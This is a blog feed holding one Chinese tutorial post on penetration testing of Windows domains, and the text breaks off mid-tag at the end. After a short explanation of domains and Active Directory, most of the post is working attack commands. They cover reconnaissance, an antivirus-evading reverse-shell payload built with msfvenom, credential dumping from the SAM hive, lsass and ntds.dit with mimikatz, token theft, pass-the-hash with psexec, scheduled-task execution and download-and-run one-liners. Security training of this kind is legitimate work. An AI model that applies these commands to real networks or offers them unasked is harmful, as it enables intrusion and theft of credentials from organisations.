<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chaceshadow&#39;s Blog</title>
  
  <subtitle>神无月</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-09-29T11:28:04.028Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Ch4ce</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网渗透之初识域渗透</title>
    <link href="http://yoursite.com/2020/09/29/DomainPenetration/"/>
    <id>http://yoursite.com/2020/09/29/DomainPenetration/</id>
    <published>2020-09-29T11:01:22.000Z</published>
    <updated>2020-09-29T11:28:04.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透之初识域渗透"><a href="#内网渗透之初识域渗透" class="headerlink" title="内网渗透之初识域渗透"></a>内网渗透之初识域渗透</h1><h2 id="0x01-初识域环境"><a href="#0x01-初识域环境" class="headerlink" title="0x01 初识域环境"></a>0x01 初识域环境</h2><h3 id="一、什么是域"><a href="#一、什么是域" class="headerlink" title="一、什么是域"></a>一、什么是域</h3><p>将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。</p><a id="more"></a><h3 id="二、域的优点-为什么使用域"><a href="#二、域的优点-为什么使用域" class="headerlink" title="二、域的优点(为什么使用域)"></a>二、域的优点(为什么使用域)</h3><p>那么域网络结构有什么优点呢？域的优点主要有以下几个方面：</p><h4 id="1、权限管理比较集中，管理成本降低"><a href="#1、权限管理比较集中，管理成本降低" class="headerlink" title="1、权限管理比较集中，管理成本降低"></a>1、权限管理比较集中，管理成本降低</h4><p>域环境中，所有的网络资源，包括用户均是在域控制器上维护的，便于集中管理，所有用户只要登入到域，均能在域内进行身份验证，管理人员可以较好的管理计算机资源，管理网络的成本大大降低；同时在域环境中也可以防止企业员工在域成员主机上违规安装软件，增强客户端安全性，减少客户端故障，降低维护成本。</p><h4 id="2、保密性加强"><a href="#2、保密性加强" class="headerlink" title="2、保密性加强"></a>2、保密性加强</h4><p>有利于企业的一些保密资料的管理，可以单独对资源进行权限控制，允许或拒绝特定的域账户对资源的请求。</p><h4 id="3、安全性加强"><a href="#3、安全性加强" class="headerlink" title="3、安全性加强"></a>3、安全性加强</h4><p>使用漫游账户和文件夹重定向，个人账户的工作文件及数据等可以存储在服务器上，进行统一备份及管理，使用户的数据更加安全有保障；同时域控制器能够分发应用程序、系统补丁，用户可以选择安装，也可以由系统管理员指派自动安装，数据及系统安全性大大提高。</p><h4 id="4、提高了便捷性"><a href="#4、提高了便捷性" class="headerlink" title="4、提高了便捷性"></a>4、提高了便捷性</h4><p>可由管理员指派登陆脚本映射，用户登录后就可以像使用本地盘符一样，使用网络上的资源，且不需要再次输入密码。</p><p>基于以上原因，很多企业的内网均会采用域环境，所以作为一名合格的渗透测试人员，域渗透的常规思路和技巧要熟练掌握。</p><h3 id="三、域的基本名词解释"><a href="#三、域的基本名词解释" class="headerlink" title="三、域的基本名词解释"></a>三、域的基本名词解释</h3><h4 id="1、域控制器（DC）"><a href="#1、域控制器（DC）" class="headerlink" title="1、域控制器（DC）"></a>1、域控制器（DC）</h4><p>域控制器是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为“域控制器（Domain Controller，简写为DC）”，简称域控。</p><p>域控制器( Domain controller，DC)是活动目录的存储位置,安装了活动目录的计算机称为域控制器。在第一次安装活动目录时,安装活动目录的那台计算机就成为域控制器,简称“域控”。域控制器存储着目录数据并管理用户域的交互关系,其中包括用户登录过程、身份验证和目录搜索等。一个域可以有多个域控制器。为了获得高可用性和容错能力,规模较小的域只需两个域控制器,一个实际使用,另一个用于容错性检査;规模较大的域可以使用多个域控制器。</p><h4 id="2、活动目录（Active-Directory）"><a href="#2、活动目录（Active-Directory）" class="headerlink" title="2、活动目录（Active Directory）"></a>2、活动目录（Active Directory）</h4><p>活动目录（Active Directory）是面向Windows Standard Server、Windows Enterprise Server以及 Windows Datacenter Server的<a href="https://baike.baidu.com/item/目录服务/10413830" target="_blank" rel="noopener">目录服务</a>。<a href="https://baike.baidu.com/item/活动目录服务/927529" target="_blank" rel="noopener">活动目录服务</a>是Windows Server 2000操作系统平台的中心组件之一。（Active Directory不能运行在Windows Web Server上，但是可以通过它对运行Windows Web Server的计算机进行管理。）</p><p>Active Directory存储了有关网络对象的信息，并且让管理员和用户能够轻松地查找和使用这些信息。目录包含了有关各种对象 [例如用户、用户组、计算机、域、组织单位（OU）以及安全策略] 的信息。Active Directory使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</p><h4 id="3、域用户"><a href="#3、域用户" class="headerlink" title="3、域用户"></a>3、域用户</h4><p>域用户帐号是在域的domain users组中，本地用户账户在本地user组中。</p><p>在计算机加入域时，会把domain users组添加到user组中。因此对客户机来说，两者完全是一样的。</p><p>区别只在于当其他客户机也加入域时，也添加了domain users组，因此域用户帐号还可以访问其他客户机。 用户名和密码到域控制器验证，域账户可以在任意一台加入域的电脑上登陆，多台电脑也可以同时登陆一个用户。</p><h4 id="4、域管"><a href="#4、域管" class="headerlink" title="4、域管"></a>4、域管</h4><p>登录到域控制器上，对一切权限进行控制，而不用到每一台域机器电脑前进行设置。</p><h4 id="5-、域用户组"><a href="#5-、域用户组" class="headerlink" title="5 、域用户组"></a>5 、域用户组</h4><p>公司很多员工的权限都是相同的，那我们可以通过使用分组将不同的用户放入不同的分组，对这些相同的权限只需要设置一次，然后将改权限分配给该组。免去了对每个用户进行设置的麻烦。</p><h5 id="域组的类型"><a href="#域组的类型" class="headerlink" title="域组的类型"></a>域组的类型</h5><ol><li><p><a href="https://baike.baidu.com/item/安全组" target="_blank" rel="noopener">安全组</a>：主要用来设置权限用的。也可用在与安全无关的任务上，如：通过E-mail软件将E-mail发送给某个分布式组。</p></li><li><p>分布式组：用在与安全无关的任务上。如：通过E-mail软件将E-mail发送给某个分布式组，（应用程序须支持AD才可使用分布式组）。无法设置分布式组的权限。</p></li></ol><h5 id="域组的使用领域"><a href="#域组的使用领域" class="headerlink" title="域组的使用领域"></a>域组的使用领域</h5><p>从组的使用领域来分，win2003域组可分为以下三类：<a href="https://baike.baidu.com/item/全局组" target="_blank" rel="noopener">全局组</a>、本地域组、<a href="https://baike.baidu.com/item/通用组" target="_blank" rel="noopener">通用组</a></p><ol><li><a href="https://baike.baidu.com/item/全局组" target="_blank" rel="noopener">全局组</a>：</li></ol><ul><li>成员范围：只能包含所属域内的用户和<a href="https://baike.baidu.com/item/全局组" target="_blank" rel="noopener">全局组</a>；</li><li>可访问资源范围：可以访问所有域的资源。</li></ul><ol start="2"><li>本地域组</li></ol><ul><li>成员范围：所有域内的用户、<a href="https://baike.baidu.com/item/全局组" target="_blank" rel="noopener">全局组</a>、<a href="https://baike.baidu.com/item/通用组" target="_blank" rel="noopener">通用组</a>，所属域内的本地域组；</li><li>可访问资源范围：只可访问所属域的资源。</li></ul><ol start="3"><li><a href="https://baike.baidu.com/item/通用组" target="_blank" rel="noopener">通用组</a></li></ol><ul><li>成员范围：所有域内的用户、<a href="https://baike.baidu.com/item/全局组" target="_blank" rel="noopener">全局组</a>、<a href="https://baike.baidu.com/item/通用组" target="_blank" rel="noopener">通用组</a>；</li><li>可访问资源范围：可以访问所有域的资源。</li></ul><p>注：1）域功能级别为win2000混合模式时不支持<a href="https://baike.baidu.com/item/通用组" target="_blank" rel="noopener">通用组</a>；2）域功能级别为win2000混合模式时不支持<a href="https://baike.baidu.com/item/全局组" target="_blank" rel="noopener">全局组</a>嵌套。</p><h4 id="6、信任域"><a href="#6、信任域" class="headerlink" title="6、信任域"></a>6、信任域</h4><p>在很多实际情况中，一个又有下面的子公司，所以就造成母公司有一个域，子公司有也有一个单独的域。母公司的域与子公司的域如何联系起来呢？我们可以在它们之间建立一种叫信任( Trust)的关系。如果母公司的帐户想要能够登录到子公司的域中，子公司的域就要对母公司的减建立信任关系。当母公司域的帐户想要登录到子公司域中时，子公司域由于信任母公司的域，所以它会听从从母公司域的域控制器返回的 access key。反过来,由于母公司的域没有建立对子公司的信任，所以如果子公司的帐户想要登录到母公司的域中是不可能的</p><p>/ domain trusts返回受信任域的列表</p><h2 id="0x02-域信息收集"><a href="#0x02-域信息收集" class="headerlink" title="0x02 域信息收集"></a>0x02 域信息收集</h2><h3 id="一、nltes查询信任域"><a href="#一、nltes查询信任域" class="headerlink" title="一、nltes查询信任域"></a>一、nltes查询信任域</h3><p>信任域：可以在工作组里查询，查询内网里是否有域环境</p><p><code>nltest /domain_trusts /all_trusts /v /server:192.168.52.2</code> </p><p>返回所有信任192.168.52.2的域</p><p><code>nltest /dsgetdc:XXXX /server:192.168.52.2</code></p><p>返回域控和其相应的IP地址，XXXX是上一步结果中的一个域</p><p><img src="/2020/09/29/DomainPenetration/1.png" alt="image"></p><h3 id="二、域环境信息收集"><a href="#二、域环境信息收集" class="headerlink" title="二、域环境信息收集"></a>二、域环境信息收集</h3><h4 id="1、Csvde"><a href="#1、Csvde" class="headerlink" title="1、Csvde"></a>1、Csvde</h4><p>Csvde是windows Server 2008 的内置命令行工具，位于%windir%/system32文件夹中，如果您安装了AD DS或Activity Directory轻型目录服务（AD LDS）服务器角色，则此功能可用</p><p>适用于：Windows Server 2003，Windows Server 2008，Windows Server 2003 R2，Windows Server 2008 R2，Windows Server 2012，带有SP1，Windows 8的Windows Server 2003</p><p><code>csvde -setspn domain-f c:\domain.scv</code>， <code>domain</code> 是域名称，<code>c:\domain.scv</code>是保存路径和文件格式</p><p><img src="/2020/09/29/DomainPenetration/2.png" alt="image"></p><ul><li>LDAP的存储规则</li><li>区分名（DN，Distinguished Name）一个条目的区分名称叫做“dn”或者叫做区分名。在一个目录中这个名称总是唯一的。</li><li>CN=Common Name 为用户名或服务器名，最长可以到80个字符，可以为中文；</li><li>OU=Organization Unit为组织单元，最多可以有四级，每级最长32个字符，可以为中文；</li><li>O=Organization为组织名，可以3-64个字符长</li><li>C=Country为国家名，可选，为2个字符长</li></ul><p><img src="/2020/09/29/DomainPenetration/3.png" alt="image"></p><h4 id="2、Setspn"><a href="#2、Setspn" class="headerlink" title="2、Setspn"></a>2、Setspn</h4><p><code>setspn -T hack -Q */*</code></p><p>SPN官方名称即为“服务主体名称”，本质上存的就是域内各种服务资源的对应关系（对应的服务类型、机器名称、服务端口等）</p><p>借助SPN快速定位当前目标域中所有存活的各类服务器</p><p><img src="/2020/09/29/DomainPenetration/4.png" alt="image"></p><h4 id="3、Dnsdump"><a href="#3、Dnsdump" class="headerlink" title="3、Dnsdump"></a>3、Dnsdump</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnsdump.exe -u 域名\域用户 -p 域密码 域孔机器名</span><br><span class="line">dnsdump.exe -u hack\iis_user -p 1qaz@WSX windows_server_2016_dc -r</span><br></pre></td></tr></table></figure><p><img src="/2020/09/29/DomainPenetration/5.png" alt="image"></p><p>4 、Net</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net user &#x2F;domain获取用户列表</span><br><span class="line">net group &quot;domain admin&quot; &#x2F;domain获取与管理员列表</span><br><span class="line">net group &quot;domain controllers&quot; &#x2F;domain查看域控制器（数量）</span><br><span class="line">net group &quot;domain computers&quot; &#x2F;domain 查看域机器</span><br><span class="line">net group &#x2F;domain 查询域里面的组</span><br></pre></td></tr></table></figure><p><img src="/2020/09/29/DomainPenetration/6.png" alt="image"></p><p><img src="/2020/09/29/DomainPenetration/7.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net view查看同一域内机器列表</span><br><span class="line">net view \\ip查看某IP共享</span><br><span class="line">net view \\GHQ查看GHQ计算机的共享资源列表</span><br><span class="line">net view &#x2F;domain查看内网存在多少个域</span><br><span class="line">net view &#x2F;domain:XYZ查看XYZ域中的机器列表</span><br></pre></td></tr></table></figure><p><img src="/2020/09/29/DomainPenetration/8.png" alt="image"></p><h4 id="4、nbtscan"><a href="#4、nbtscan" class="headerlink" title="4、nbtscan"></a>4、nbtscan</h4><p><code>nbtscan.exe 192.168.52.0/24</code></p><p><img src="/2020/09/29/DomainPenetration/9.png" alt="image"></p><h2 id="0x03-域渗透思路"><a href="#0x03-域渗透思路" class="headerlink" title="0x03 域渗透思路"></a>0x03 域渗透思路</h2><h3 id="一、渗透思路"><a href="#一、渗透思路" class="headerlink" title="一、渗透思路"></a>一、渗透思路</h3><p>横向渗透 - &gt; 权限维持 - &gt;取密码(获取一个域用户账号密码)  - &gt;域信息收集 - &gt;横向渗透 - &gt;取密码 - &gt;获取域管权限 - &gt;拿下域控服务器</p><p>横向渗透的思路（适用于工作组渗透和域渗透）</p><p><img src="/2020/09/29/DomainPenetration/10.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">内网GetShell--&gt; A(弱口令)</span><br><span class="line">A --&gt; RDP,SMB弱口令</span><br><span class="line">A --&gt; SSH弱口令</span><br><span class="line">A --&gt; MSSQL弱口令</span><br><span class="line">A --&gt; Tomcat弱口令 --&gt; 使用python脚本war.py</span><br><span class="line">内网GetShell--&gt; B(未授权)</span><br><span class="line">内网GetShell--&gt; C(RCE)</span><br><span class="line">C --&gt; Jboss</span><br><span class="line">C --&gt; Weblogic&#x2F;扫描端口</span><br><span class="line">C --&gt; Struts2&#x2F;扫描内网web,后缀为action和do</span><br><span class="line">C --&gt; 致远OA&#x2F;通过内网扫描web标题找出致远OA漏洞</span><br><span class="line">内网GetShell--&gt; D(反序列化)</span><br><span class="line">D --&gt; Shiro&#x2F;Python脚本shio_vul.py</span><br><span class="line">D --&gt; RMI</span><br><span class="line">D --&gt; Jdwp</span><br></pre></td></tr></table></figure><h3 id="二、权限维持"><a href="#二、权限维持" class="headerlink" title="二、权限维持"></a>二、权限维持</h3><h4 id="1、DLL文件加载shellcode免杀上线"><a href="#1、DLL文件加载shellcode免杀上线" class="headerlink" title="1、DLL文件加载shellcode免杀上线"></a>1、DLL文件加载shellcode免杀上线</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp_uuid LPORT=9999 LHOST=192.168.1.1 -e X86/shikata_ga_nai -i 11 -f c -o shellcode.c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; set payload windows/meterpreter/reverse_tcp_uuid</span><br><span class="line">msf &gt; set lhost 192.168.1.1</span><br><span class="line">msf &gt; set lport 8888</span><br><span class="line">msf &gt; set EnableStageEncodeing true</span><br><span class="line">msf &gt; set StageEncoder X86/fnstenv_mov</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure><p>生成的shellcode放入下图代码中标记的位置</p><p><img src="/2020/09/29/DomainPenetration/11.png" alt="image"></p><p>编译生成dll执行，成功上线</p><p><img src="/2020/09/29/DomainPenetration/12.png" alt="image"></p><h4 id="2、注册表读取密码"><a href="#2、注册表读取密码" class="headerlink" title="2、注册表读取密码"></a>2、注册表读取密码</h4><p>正常我们一般使用mimikatz读取密码，但是一般查毒软件都会查杀，下面我们通过注册表读取密码绕过查杀</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取注册表信息</span><br><span class="line">reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</span><br><span class="line">reg save HKLM\SAM c:\windows\temp\Sam.hiv</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取注册表密码文件后下载至本机</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; mimikatz运行解密命令获取hash NTLM ,然后通过MD5解密</span><br><span class="line">mimikatz.exe</span><br><span class="line">lsadump::sam &#x2F;sam:Sam.hiv &#x2F;system:Sys.hiv</span><br></pre></td></tr></table></figure><p><img src="/2020/09/29/DomainPenetration/13.png" alt="image"></p><h4 id="3、Lsass读取内存hash"><a href="#3、Lsass读取内存hash" class="headerlink" title="3、Lsass读取内存hash"></a>3、Lsass读取内存hash</h4><p>lsass进程获取内存hash，lsass.exe进程会保存机器登录过的用户密码（2008之前密码是明文存储，2012和2016都是密文hash存储）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 在目标机器上执行procdump.exe</span><br><span class="line">procdumo.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在mimikatz中运行 结果保存在日志中</span><br><span class="line">mimikatz.exe &quot;sekurlas::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekulsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure><p>Win2012演示如下：</p><p><img src="/2020/09/29/DomainPenetration/14.png" alt="image"></p><p><img src="/2020/09/29/DomainPenetration/15.png" alt="image"></p><p>Win2008演示如下：</p><p><img src="/2020/09/29/DomainPenetration/16.png" alt="image"></p><h4 id="4、LaZagne工具获取密码"><a href="#4、LaZagne工具获取密码" class="headerlink" title="4、LaZagne工具获取密码"></a>4、LaZagne工具获取密码</h4><p>LaZagne取各种连接工具密码、浏览器保存密码等</p><p>下载地址：<code>https://github.com/AlessandroZ/LaZagne</code></p><p><img src="/2020/09/29/DomainPenetration/17.png" alt="image"></p><h4 id="5、凭证窃取"><a href="#5、凭证窃取" class="headerlink" title="5、凭证窃取"></a>5、凭证窃取</h4><p>通过tasklist /v查看进程用户，如果有域用户开启的进程，则可以通过凭证窃取域用户的进程</p><p>登录一台机器本地账户发现机器运行如下域用户进行</p><p><img src="/2020/09/29/DomainPenetration/18.png" alt="image"></p><p>通过incognito工具窃取凭据</p><p>下载地址1：<code>https://github.com/FSecureLABS/incognito</code></p><p>下载地址2：<code>https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens -u</span><br><span class="line">incognito.exe execute -c &quot;HACK\Administrator&quot; cmd.exe</span><br></pre></td></tr></table></figure><p><img src="/2020/09/29/DomainPenetration/19.png" alt="image"></p><h4 id="6、命令行渗透"><a href="#6、命令行渗透" class="headerlink" title="6、命令行渗透"></a>6、命令行渗透</h4><h5 id="a、为什么命令行渗透？"><a href="#a、为什么命令行渗透？" class="headerlink" title="a、为什么命令行渗透？"></a>a、为什么命令行渗透？</h5><ul><li>远程登陆桌面增加暴露风险；</li><li>目标管理员可能对服务器禁用远程登陆。</li></ul><h5 id="b、建立IPC连接执行命令"><a href="#b、建立IPC连接执行命令" class="headerlink" title="b、建立IPC连接执行命令"></a>b、建立IPC连接执行命令</h5><ul><li>可以访问目标机器的文件（上传、下载），也可以在目标机器上运行命令。</li><li>上传和下载文件直接通过copy命令就可以，不过路径换成UNC路径。</li><li>何为UNC路径？简单来讲以\开头的路径就是UNC路径，比如\192.168.1.2\c$\users。</li></ul><p>如果要从本地当前目录上传1.bat到192.168.1.2机器C盘根目录下，那么命令就是</p><p><code>copy 1.bat \\192.168.1.2\C$\</code></p><p>反之就是下载</p><p>dir、copy、xcopy、move、type的参数都可使用UNC路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.52.2 &#x2F;u:hack\adminidtrator Windows2019***建立IPC连接</span><br><span class="line">copy sbn.exe \\192.168.52.2\C$\windows\temp复制本地文件到目标服务器</span><br><span class="line">copy \\192.168.52.2\C$\windows\temp\hash.txt复制目标服务器文件到本地</span><br></pre></td></tr></table></figure><p><img src="/2020/09/29/DomainPenetration/20.png" alt="image"></p><h5 id="c-、Schtasks计划任务执行命令"><a href="#c-、Schtasks计划任务执行命令" class="headerlink" title="c 、Schtasks计划任务执行命令"></a>c 、Schtasks计划任务执行命令</h5><p>推荐用schtasks计划任务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 创建计划任务</span><br><span class="line">schtasks /create /tn taskName /U 域\域用户 /P 域用户密码 /tr 执行的命令或者bat路径  /sc ONSTART /s 域机器IP /RU system</span><br><span class="line"></span><br><span class="line">// 运行计划任务</span><br><span class="line">schtasks /run /tn taskName /s 域机器IP /U 域\域用户 /P 域用户密码</span><br><span class="line"></span><br><span class="line">// 删除计划任务</span><br><span class="line">schtasks /F /delete /tn taskName /s 域机器IP /U 域\域用户  /P  域用户密码</span><br></pre></td></tr></table></figure><p><img src="/2020/09/29/DomainPenetration/21.png" alt="image"></p><h5 id="d、psexec执行命令"><a href="#d、psexec执行命令" class="headerlink" title="d、psexec执行命令"></a>d、psexec执行命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 建立IPC连接</span><br><span class="line"></span><br><span class="line">net use \\192.168.52.2 &#x2F;u:DomainName\UserName password*</span><br><span class="line"></span><br><span class="line">psexec.exe \\192.168.52.2 -s cmd.exe -accepteula</span><br></pre></td></tr></table></figure><p>-accepteula     第一次运行会弹框，输入这个参数便不会弹框</p><p>-s     以“nt authority\system”权限运行远程进程</p><ul><li>hash传递攻击</li></ul><p>//当hash没有解出来的时候，可以使用hash传递攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -hashes :用户hash 域名&#x2F;用户名@目标IP</span><br><span class="line"></span><br><span class="line">psexec.exe -hashes:70a50724b37f6d3d03d00c24e946fde3 hack&#x2F;administrator@192.168.52.2</span><br></pre></td></tr></table></figure><p><img src="/2020/09/29/DomainPenetration/22.png" alt="image"></p><h5 id="e、命令行下载文件"><a href="#e、命令行下载文件" class="headerlink" title="e、命令行下载文件"></a>e、命令行下载文件</h5><p>1 - powershell(win2003、 winXP不支持)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">power -exec bypass -c (new-object SystemNet.webctient).Downloadfie(&#39;http:&#x2F;&#x2F;192.168.1.101&#x2F;test.txt&#39;,&#39;c:\test.txt&#39;)</span><br></pre></td></tr></table></figure><p>2 - certutil</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.1&#x2F;test.txtfile.txt</span><br></pre></td></tr></table></figure><p>3 - bitadmin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getfile http:&#x2F;&#x2F;192.168.3.1&#x2F;test.txt E:\file\test.txt</span><br><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getpayload http:&#x2F;&#x2F;192.168.3.1&#x2F;test.txt E:\file\test.txt</span><br></pre></td></tr></table></figure><p>4 - msiexec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec &#x2F;q &#x2F;i http:&#x2F;&#x2F;192.168.1.1&#x2F;test.txt</span><br></pre></td></tr></table></figure><p>5 - IEExec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; caspol -s off</span><br><span class="line">C:\Windows\microsoft.NET\Framework\v2.0.50727&gt; IEExec.exe http:&#x2F;&#x2F;192.168.1.1&#x2F;test.exe</span><br></pre></td></tr></table></figure><h4 id="7、获取内网代理"><a href="#7、获取内网代理" class="headerlink" title="7、获取内网代理"></a>7、获取内网代理</h4><p>内网有些资源可能需要挂指定代理才可以访问：</p><ul><li>ie代理</li><li>pac代理</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 直接查询HKEY_CURRENT_USER(ie 代理)</span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; &#x2F;v ProxyServer</span><br></pre></td></tr></table></figure><p><img src="/2020/09/29/DomainPenetration/23.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 直接查询HKEY_CURRENT_USER(pac 代理)</span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; &#x2F;v AutoConfigURL</span><br></pre></td></tr></table></figure><p><img src="/2020/09/29/DomainPenetration/24.png" alt="image"></p><h4 id="8、windows-api使用"><a href="#8、windows-api使用" class="headerlink" title="8、windows api使用"></a>8、windows api使用</h4><p>利用API 写成一些小工具。所有工具使用前提：建立IPC连接。</p><p>工具名称：（这些Exe的名字，也都是api的名字）</p><p>NetGroupGetUsers.exe：查询域里的各个组里的成员，IP必须是域控IP，域用户随意。</p><p>NetLocalGroupGetMembers.exe:查询目标服务器本地管理组的成员。</p><p>NetUserEnum.exe:查询目标服务器所有用户，包括隐藏用户。</p><p><img src="/2020/09/29/DomainPenetration/25.png" alt="image"></p><h4 id="9、导出域hash"><a href="#9、导出域hash" class="headerlink" title="9、导出域hash"></a>9、导出域hash</h4><p>Windows的密码是经过hash后存储的，本地存在hklm\sam，hklm\system注册表中</p><p>域里面存在域控制器的c:\windows\ntds\ntds.dit中，我们取出来解密即可</p><p>ntds.dit其实就是个esent数据库，微软本身就有一系列的文档化api能够操作这个数据库</p><p><code>https://msdn.microsoft.com/en-us/library/windows/desktop/gg294074.aspx</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 第一步：创建快照 获取｛｝中的ID,必须在域控服务器上操作</span><br><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第二步：挂载快照</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;8a8db83f-dad7-b61d-ef272a3a483f&#125;&quot; quit quit</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第三步：复制ntds.dit</span><br><span class="line">copy C:\$SNAP_201910121047_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第四步：卸载快照</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;8a8db83f-dad7-b61d-ef272a3a483f&#125;&quot; quit quit</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第五步：删除快哉</span><br><span class="line">ntdsutil snapshot &quot;delete &#123;8a8db83f-dad7-b61d-ef272a3a483f&#125;&quot; quit quit</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第六步：获取key</span><br><span class="line">reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第七步：使用NTDSDumpEx获取所有域用户的Hash</span><br><span class="line">NTDSDumpEx.exe -d ntds.dit -o hash.txt -s Sys.hiv -h</span><br></pre></td></tr></table></figure><p><img src="/2020/09/29/DomainPenetration/26.png" alt="image"></p><p>最后成功获取当前域控中所有域账户和密码</p><p><img 